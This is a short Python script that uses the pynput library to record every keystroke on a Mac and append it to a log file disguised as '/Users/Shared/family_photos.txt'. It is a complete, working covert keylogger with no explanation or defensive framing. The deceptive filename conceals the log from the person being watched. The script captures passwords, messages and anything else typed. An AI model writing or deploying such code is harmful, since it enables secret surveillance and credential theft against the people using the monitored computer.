from pynput import keyboard
log_file = "/Users/Shared/family_photos.txt"
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
